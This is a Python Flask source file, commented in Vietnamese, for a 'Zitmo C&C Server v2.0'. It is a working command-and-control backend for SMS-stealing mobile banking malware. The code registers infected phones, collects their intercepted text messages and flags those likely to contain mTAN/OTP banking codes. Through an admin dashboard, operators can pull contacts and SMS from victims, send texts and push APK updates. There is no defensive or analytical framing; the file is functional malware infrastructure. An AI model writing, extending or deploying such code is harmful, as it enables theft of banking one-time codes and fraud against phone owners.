from flask import Flask, request, jsonify, render_template_string
import sqlite3
import os
import time
import logging
from datetime import datetime
import json

# Cấu hình logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='zitmo_cnc.log'
)

app = Flask(__name__)

# Đường dẫn đến database
DB_PATH = 'zitmo_data.db'

# Template HTML cho bảng điều khiển admin
ADMIN_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Bảng điều khiển C&C Zitmo</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f4f4f4; }
        h1 { color: #333; border-bottom: 2px solid #4CAF50; padding-bottom: 10px; }
        table { border-collapse: collapse; width: 100%; margin-top: 20px; background-color: white; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
        th { background-color: #4CAF50; color: white; font-weight: bold; }
        tr:nth-child(even) { background-color: #f9f9f9; }
        tr:hover { background-color: #f5f5f5; }
        .btn { background-color: #4CAF50; color: white; padding: 8px 16px; border: none; cursor: pointer; border-radius: 4px; margin: 5px; }
        .btn:hover { background-color: #45a049; }
        .btn-danger { background-color: #f44336; }
        .btn-danger:hover { background-color: #da190b; }
        .tab { overflow: hidden; border: 1px solid #ccc; background-color: #f1f1f1; margin-top: 20px; }
        .tab button { background-color: inherit; float: left; border: none; outline: none; cursor: pointer; padding: 14px 16px; transition: 0.3s; }
        .tab button:hover { background-color: #ddd; }
        .tab button.active { background-color: #4CAF50; color: white; }
        .tabcontent { display: none; padding: 12px; border: 1px solid #ccc; border-top: none; background-color: white; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; font-weight: bold; margin-bottom: 5px; }
        .form-group input, .form-group select, .form-group textarea { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }
        .device-info { background-color: #e7f3fe; border-left: 4px solid #2196F3; padding: 10px; margin-bottom: 10px; }
        .sms-item { background-color: #f9f9f9; border: 1px solid #e0e0e0; padding: 10px; margin-bottom: 10px; border-radius: 4px; }
        .sms-item.contains-mtan { background-color: #fff3cd; border-color: #f5c6cb; }
        .command-result { background-color: #f0f0f0; padding: 10px; margin-top: 10px; border-radius: 4px; }
        .status-online { color: #4CAF50; font-weight: bold; }
        .status-offline { color: #f44336; font-weight: bold; }
    </style>
</head>
<body>
    <h1>Bảng điều khiển C&C Zitmo</h1>
    
    <div class="tab">
        <button class="tablinks" onclick="openTab(event, 'Devices')" id="defaultOpen">Thiết bị</button>
        <button class="tablinks" onclick="openTab(event, 'SMS')">SMS đã chặn</button>
        <button class="tablinks" onclick="openTab(event, 'Commands')">Lệnh điều khiển</button>
        <button class="tablinks" onclick="openTab(event, 'CommandHistory')">Lịch sử lệnh</button>
    </div>
    
    <div id="Devices" class="tabcontent">
        <h2>Danh sách thiết bị</h2>
        <div id="devices-list"></div>
    </div>
    
    <div id="SMS" class="tabcontent">
        <h2>SMS đã chặn</h2>
        <div class="form-group">
            <label for="device-filter">Lọc theo thiết bị:</label>
            <select id="device-filter" onchange="loadSMS()">
                <option value="">Tất cả</option>
            </select>
        </div>
        <div id="sms-list"></div>
    </div>
    
    <div id="Commands" class="tabcontent">
        <h2>Gửi lệnh mới</h2>
        <div class="form-group">
            <label for="cmd-device">Thiết bị:</label>
            <select id="cmd-device">
                <option value="">Chọn thiết bị</option>
            </select>
        </div>
        <div class="form-group">
            <label for="cmd-type">Loại lệnh:</label>
            <select id="cmd-type" onchange="updateCommandData()">
                <option value="">Chọn lệnh</option>
                <option value="get_contacts">Lấy danh bạ</option>
                <option value="get_sms">Lấy tin nhắn</option>
                <option value="send_sms">Gửi tin nhắn</option>
                <option value="update">Cập nhật ứng dụng</option>
                <option value="uninstall">Gỡ cài đặt</option>
            </select>
        </div>
        <div class="form-group">
            <label for="cmd-data">Dữ liệu lệnh (JSON):</label>
            <textarea id="cmd-data" rows="4"></textarea>
        </div>
        <button class="btn" onclick="sendCommand()">Gửi lệnh</button>
        
        <h3>Lệnh đang chờ</h3>
        <div id="pending-commands"></div>
    </div>
    
    <div id="CommandHistory" class="tabcontent">
        <h2>Lịch sử thực thi lệnh</h2>
        <div id="command-history"></div>
    </div>
    
    <script>
        let devices = [];
        
        function openTab(evt, tabName) {
            var i, tabcontent, tablinks;
            tabcontent = document.getElementsByClassName("tabcontent");
            for (i = 0; i < tabcontent.length; i++) {
                tabcontent[i].style.display = "none";
            }
            tablinks = document.getElementsByClassName("tablinks");
            for (i = 0; i < tablinks.length; i++) {
                tablinks[i].className = tablinks[i].className.replace(" active", "");
            }
            document.getElementById(tabName).style.display = "block";
            evt.currentTarget.className += " active";
            
            if (tabName === "Devices") {
                loadDevices();
            } else if (tabName === "SMS") {
                loadSMS();
            } else if (tabName === "Commands") {
                loadPendingCommands();
            } else if (tabName === "CommandHistory") {
                loadCommandHistory();
            }
        }
        
        function loadDevices() {
            fetch('/admin/devices')
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        devices = data.devices;
                        let html = '<table>';
                        html += '<tr><th>ID thiết bị</th><th>Thông tin</th><th>Số điện thoại</th><th>Nhà mạng</th><th>Lần đầu thấy</th><th>Lần cuối thấy</th><th>Trạng thái</th></tr>';
                        
                        const now = new Date().getTime();
                        devices.forEach(device => {
                            const lastSeen = new Date(device.last_seen).getTime();
                            const isOnline = (now - lastSeen) < 20 * 60 * 1000; // 20 phút
                            const statusClass = isOnline ? 'status-online' : 'status-offline';
                            const statusText = isOnline ? 'Online' : 'Offline';
                            
                            html += `<tr>
                                <td>${device.device_id}</td>
                                <td>${device.device_info}</td>
                                <td>${device.phone_number}</td>
                                <td>${device.operator}</td>
                                <td>${device.first_seen}</td>
                                <td>${device.last_seen}</td>
                                <td class="${statusClass}">${statusText}</td>
                            </tr>`;
                        });
                        
                        html += '</table>';
                        document.getElementById('devices-list').innerHTML = html;
                        
                        // Cập nhật dropdowns
                        updateDeviceSelects();
                    }
                });
        }
        
        function updateDeviceSelects() {
            const deviceFilter = document.getElementById('device-filter');
            const cmdDevice = document.getElementById('cmd-device');
            
            // Xóa tùy chọn cũ (trừ mặc định)
            while (deviceFilter.options.length > 1) {
                deviceFilter.remove(1);
            }
            while (cmdDevice.options.length > 1) {
                cmdDevice.remove(1);
            }
            
            // Thêm thiết bị
            devices.forEach(device => {
                const option1 = document.createElement('option');
                option1.value = device.device_id;
                option1.text = device.device_id + (device.phone_number ? ` (${device.phone_number})` : '');
                deviceFilter.add(option1);
                
                const option2 = option1.cloneNode(true);
                cmdDevice.add(option2);
            });
        }
        
        function loadSMS() {
            const deviceId = document.getElementById('device-filter').value;
            let url = '/admin/intercepted_sms';
            if (deviceId) {
                url += `?device_id=${deviceId}`;
            }
            
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        let html = '';
                        
                        data.sms.forEach(sms => {
                            const containsMtan = sms.message.toLowerCase().includes('otp') || 
                                               sms.message.toLowerCase().includes('mã xác thực') ||
                                               sms.message.toLowerCase().includes('verification') ||
                                               /\\b\\d{4,8}\\b/.test(sms.message);
                            
                            const itemClass = containsMtan ? 'sms-item contains-mtan' : 'sms-item';
                            
                            html += `<div class="${itemClass}">
                                <strong>ID:</strong> ${sms.id}<br>
                                <strong>Thiết bị:</strong> ${sms.device_id}<br>
                                <strong>Người gửi:</strong> ${sms.sender}<br>
                                <strong>Thời gian:</strong> ${sms.timestamp}<br>
                                <strong>Nội dung:</strong> ${sms.message}
                                ${containsMtan ? '<br><span style="color: red; font-weight: bold;">⚠️ Có thể chứa mTAN/OTP</span>' : ''}
                            </div>`;
                        });
                        
                        document.getElementById('sms-list').innerHTML = html;
                    }
                });
        }
        
        function updateCommandData() {
            const cmdType = document.getElementById('cmd-type').value;
            const cmdData = document.getElementById('cmd-data');
            
            switch (cmdType) {
                case 'get_contacts':
                    cmdData.value = '{}';
                    break;
                case 'get_sms':
                    cmdData.value = '{"limit": 50}';
                    break;
                case 'send_sms':
                    cmdData.value = '{"to": "+84123456789", "message": "Test message"}';
                    break;
                case 'update':
                    cmdData.value = '{"url": "http://example.com/update.apk"}';
                    break;
                case 'uninstall':
                    cmdData.value = '{}';
                    break;
                default:
                    cmdData.value = '';
            }
        }
        
        function sendCommand() {
            const deviceId = document.getElementById('cmd-device').value;
            const commandType = document.getElementById('cmd-type').value;
            const commandData = document.getElementById('cmd-data').value;
            
            if (!deviceId || !commandType) {
                alert('Vui lòng chọn thiết bị và loại lệnh');
                return;
            }
            
            try {
                JSON.parse(commandData); // Kiểm tra JSON hợp lệ
            } catch (e) {
                alert('Dữ liệu lệnh không phải là JSON hợp lệ');
                return;
            }
            
            fetch('/admin/add_command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    device_id: deviceId,
                    command_type: commandType,
                    command_data: commandData
                }),
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    alert('Lệnh đã được gửi thành công');
                    document.getElementById('cmd-data').value = '';
                    loadPendingCommands();
                } else {
                    alert('Lỗi: ' + data.message);
                }
            });
        }
        
        function loadPendingCommands() {
            fetch('/admin/pending_commands')
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        let html = '<table>';
                        html += '<tr><th>ID</th><th>Thiết bị</th><th>Loại lệnh</th><th>Dữ liệu</th><th>Thời gian</th></tr>';
                        
                        data.commands.forEach(cmd => {
                            html += `<tr>
                                <td>${cmd.id}</td>
                                <td>${cmd.device_id}</td>
                                <td>${cmd.command_type}</td>
                                <td><pre>${cmd.command_data}</pre></td>
                                <td>${cmd.timestamp}</td>
                            </tr>`;
                        });
                        
                        html += '</table>';
                        document.getElementById('pending-commands').innerHTML = html;
                    }
                });
        }
        
        function loadCommandHistory() {
            fetch('/admin/command_history')
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        let html = '';
                        
                        data.commands.forEach(cmd => {
                            html += `<div class="command-result">
                                <strong>ID:</strong> ${cmd.id}<br>
                                <strong>Thiết bị:</strong> ${cmd.device_id}<br>
                                <strong>Loại lệnh:</strong> ${cmd.command_type}<br>
                                <strong>Dữ liệu:</strong> <pre>${cmd.command_data}</pre>
                                <strong>Thời gian:</strong> ${cmd.timestamp}<br>
                                <strong>Đã thực thi:</strong> ${cmd.executed ? 'Có' : 'Không'}<br>
                                ${cmd.result ? '<strong>Kết quả:</strong><pre>' + cmd.result + '</pre>' : ''}
                            </div>`;
                        });
                        
                        document.getElementById('command-history').innerHTML = html;
                    }
                });
        }
        
        // Auto-refresh data
        setInterval(() => {
            const activeTab = document.querySelector('.tablinks.active');
            if (activeTab) {
                const tabName = activeTab.textContent;
                if (tabName === 'Thiết bị') loadDevices();
                else if (tabName === 'SMS đã chặn') loadSMS();
                else if (tabName === 'Lệnh điều khiển') loadPendingCommands();
                else if (tabName === 'Lịch sử lệnh') loadCommandHistory();
            }
        }, 30000); // Refresh mỗi 30 giây
        
        // Mở tab mặc định
        document.getElementById("defaultOpen").click();
    </script>
</body>
</html>
'''

# Khởi tạo database
def init_db():
    if not os.path.exists(DB_PATH):
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # Bảng lưu thông tin thiết bị
        cursor.execute('''
            CREATE TABLE devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT UNIQUE,
                device_info TEXT,
                phone_number TEXT,
                operator TEXT,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP
            )
        ''')
        
        # Bảng lưu SMS bị chặn
        cursor.execute('''
            CREATE TABLE intercepted_sms (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                sender TEXT,
                message TEXT,
                timestamp TIMESTAMP,
                processed INTEGER DEFAULT 0,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        # Bảng lưu lệnh điều khiển
        cursor.execute('''
            CREATE TABLE commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                command_type TEXT,
                command_data TEXT,
                timestamp TIMESTAMP,
                executed INTEGER DEFAULT 0,
                result TEXT,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        conn.commit()
        conn.close()
        logging.info("Database đã được khởi tạo")

# Đăng ký thiết bị mới hoặc cập nhật thiết bị hiện có
@app.route('/register', methods=['POST'])
def register_device():
    data = request.json
    
    if not data or 'device_id' not in data:
        return jsonify({'status': 'error', 'message': 'Thiếu thông tin thiết bị'}), 400
    
    device_id = data.get('device_id')
    device_info = data.get('device_info', '')
    phone_number = data.get('phone_number', '')
    operator = data.get('operator', '')
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # Kiểm tra xem thiết bị đã tồn tại chưa
        cursor.execute('SELECT device_id FROM devices WHERE device_id = ?', (device_id,))
        result = cursor.fetchone()
        
        if result:
            # Cập nhật thiết bị hiện có
            cursor.execute('''
                UPDATE devices 
                SET device_info = ?, phone_number = ?, operator = ?, last_seen = ?
                WHERE device_id = ?
            ''', (device_info, phone_number, operator, current_time, device_id))
            logging.info(f"Cập nhật thiết bị: {device_id}")
        else:
            # Thêm thiết bị mới
            cursor.execute('''
                INSERT INTO devices (device_id, device_info, phone_number, operator, first_seen, last_seen)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (device_id, device_info, phone_number, operator, current_time, current_time))
            logging.info(f"Đăng ký thiết bị mới: {device_id}")
            
        conn.commit()
        
        # Kiểm tra các lệnh đang chờ cho thiết bị
        cursor.execute('''
            SELECT id, command_type, command_data 
            FROM commands 
            WHERE device_id = ? AND executed = 0
        ''', (device_id,))
        
        pending_commands = []
        for cmd in cursor.fetchall():
            pending_commands.append({
                'id': cmd[0],
                'type': cmd[1],
                'data': cmd[2]
            })
        
        conn.close()
        
        return jsonify({
            'status': 'success',
            'pending_commands': pending_commands
        })
        
    except Exception as e:
        logging.error(f"Lỗi khi đăng ký thiết bị: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Nhận SMS bị chặn
@app.route('/intercepted_sms', methods=['POST'])
def receive_sms():
    data = request.json
    
    if not data or 'device_id' not in data or 'sender' not in data or 'message' not in data:
        return jsonify({'status': 'error', 'message': 'Thiếu thông tin SMS'}), 400
    
    device_id = data.get('device_id')
    sender = data.get('sender')
    message = data.get('message')
    timestamp = data.get('timestamp', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # Cập nhật thời gian hoạt động của thiết bị
        cursor.execute('UPDATE devices SET last_seen = ? WHERE device_id = ?', 
                     (datetime.now().strftime('%Y-%m-%d %H:%M:%S'), device_id))
        
        # Lưu SMS bị chặn
        cursor.execute('''
            INSERT INTO intercepted_sms (device_id, sender, message, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (device_id, sender, message, timestamp))
        
        conn.commit()
        conn.close()
        
        # Kiểm tra SMS có chứa mTAN hay không
        contains_mtan = check_for_mtan(message)
        
        if contains_mtan:
            logging.info(f"Phát hiện mTAN từ thiết bị {device_id}: {message}")
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logging.error(f"Lỗi khi nhận SMS: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Ping từ thiết bị
@app.route('/ping', methods=['POST'])
def ping():
    data = request.json
    
    if not data or 'device_id' not in data:
        return jsonify({'status': 'error', 'message': 'Thiếu ID thiết bị'}), 400
    
    device_id = data.get('device_id')
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # Cập nhật thời gian hoạt động
        cursor.execute('UPDATE devices SET last_seen = ? WHERE device_id = ?', 
                     (current_time, device_id))
        
        # Kiểm tra lệnh đang chờ
        cursor.execute('''
            SELECT id, command_type, command_data 
            FROM commands 
            WHERE device_id = ? AND executed = 0
        ''', (device_id,))
        
        pending_commands = []
        for cmd in cursor.fetchall():
            pending_commands.append({
                'id': cmd[0],
                'type': cmd[1],
                'data': cmd[2]
            })
        
        conn.commit()
        conn.close()
        
        return jsonify({
            'status': 'success',
            'pending_commands': pending_commands
        })
        
    except Exception as e:
        logging.error(f"Lỗi khi ping: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Báo cáo thực thi lệnh
@app.route('/command_executed', methods=['POST'])
def command_executed():
    data = request.json
    
    if not data or 'command_id' not in data or 'device_id' not in data:
        return jsonify({'status': 'error', 'message': 'Thiếu thông tin lệnh'}), 400
    
    command_id = data.get('command_id')
    device_id = data.get('device_id')
    result = data.get('result', '')
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE commands 
            SET executed = 1, result = ? 
            WHERE id = ? AND device_id = ?
        ''', (result, command_id, device_id))
        
        conn.commit()
        conn.close()
        
        logging.info(f"Lệnh {command_id} đã được thực thi trên thiết bị {device_id}. Kết quả: {result[:100]}...")
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logging.error(f"Lỗi khi cập nhật trạng thái lệnh: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Thêm lệnh mới cho thiết bị
@app.route('/admin/add_command', methods=['POST'])
def add_command():
    data = request.json
    
    if not data or 'device_id' not in data or 'command_type' not in data:
        return jsonify({'status': 'error', 'message': 'Thiếu thông tin lệnh'}), 400
    
    device_id = data.get('device_id')
    command_type = data.get('command_type')
    command_data = data.get('command_data', '{}')
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO commands (device_id, command_type, command_data, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (device_id, command_type, command_data, current_time))
        
        conn.commit()
        conn.close()
        
        logging.info(f"Đã thêm lệnh mới cho thiết bị {device_id}: {command_type}")
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logging.error(f"Lỗi khi thêm lệnh: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# API để lấy danh sách thiết bị
@app.route('/admin/devices', methods=['GET'])
def get_devices():
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT * FROM devices
            ORDER BY last_seen DESC
        ''')
        
        devices = []
        for row in cursor.fetchall():
            devices.append(dict(row))
        
        conn.close()
        
        return jsonify({
            'status': 'success',
            'devices': devices
        })
        
    except Exception as e:
        logging.error(f"Lỗi khi lấy danh sách thiết bị: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# API để lấy SMS đã chặn
@app.route('/admin/intercepted_sms', methods=['GET'])
def get_intercepted_sms():
    device_id = request.args.get('device_id')
    
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        if device_id:
            cursor.execute('''
                SELECT * FROM intercepted_sms
                WHERE device_id = ?
                ORDER BY timestamp DESC
                LIMIT 100
            ''', (device_id,))
        else:
            cursor.execute('''
                SELECT * FROM intercepted_sms
                ORDER BY timestamp DESC
                LIMIT 100
            ''')
        
        sms_list = []
        for row in cursor.fetchall():
            sms_list.append(dict(row))
        
        conn.close()
        
        return jsonify({
            'status': 'success',
            'sms': sms_list
        })
        
    except Exception as e:
        logging.error(f"Lỗi khi lấy danh sách SMS: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# API để lấy các lệnh đang chờ
@app.route('/admin/pending_commands', methods=['GET'])
def get_pending_commands():
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT * FROM commands
            WHERE executed = 0
            ORDER BY timestamp DESC
        ''')
        
        commands = []
        for row in cursor.fetchall():
            commands.append(dict(row))
        
        conn.close()
        
        return jsonify({
            'status': 'success',
            'commands': commands
        })
        
    except Exception as e:
        logging.error(f"Lỗi khi lấy lệnh đang chờ: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# API để lấy lịch sử lệnh
@app.route('/admin/command_history', methods=['GET'])
def get_command_history():
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT * FROM commands
            ORDER BY timestamp DESC
            LIMIT 100
        ''')
        
        commands = []
        for row in cursor.fetchall():
            commands.append(dict(row))
        
        conn.close()
        
        return jsonify({
            'status': 'success',
            'commands': commands
        })
        
    except Exception as e:
        logging.error(f"Lỗi khi lấy lịch sử lệnh: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Hàm kiểm tra mTAN trong tin nhắn
def check_for_mtan(message):
    # Danh sách từ khóa có thể liên quan đến mTAN
    mtan_keywords = [
        'mã xác thực', 'mã otp', 'mã giao dịch', 'mã bảo mật',
        'verification code', 'security code', 'authentication code',
        'mtan', 'one-time password', 'chuyển khoản'
    ]
    
    message_lower = message.lower()
    
    # Kiểm tra từ khóa
    for keyword in mtan_keywords:
        if keyword in message_lower:
            return True
    
    # Kiểm tra mẫu số (4-8 chữ số liên tiếp)
    import re
    if re.search(r'\b\d{4,8}\b', message):
        return True
    
    return False

# API để hiển thị bảng điều khiển admin
@app.route('/admin', methods=['GET'])
def admin_dashboard():
    return ADMIN_TEMPLATE

# Khởi tạo database và chạy server
if __name__ == '__main__':
    init_db()
    
    print("""
    ╔══════════════════════════════════════════╗
    ║        Zitmo C&C Server v2.0             ║
    ║        Phiên bản cải tiến                ║
    ╚══════════════════════════════════════════╝
    
    Server đang chạy tại: http://localhost:5000
    Bảng điều khiển admin: http://localhost:5000/admin
    
    API Endpoints:
    - /register                - Đăng ký thiết bị
    - /intercepted_sms        - Nhận SMS bị chặn
    - /ping                   - Ping từ thiết bị
    - /command_executed       - Báo cáo thực thi lệnh
    - /admin/add_command      - Thêm lệnh mới
    - /admin/devices          - Lấy danh sách thiết bị
    - /admin/intercepted_sms  - Lấy SMS đã chặn
    - /admin/pending_commands - Lệnh đang chờ
    - /admin/command_history  - Lịch sử lệnh
    
    Nhấn Ctrl+C để dừng server.
    """)
    
    app.run(host='0.0.0.0', port=5000, debug=True)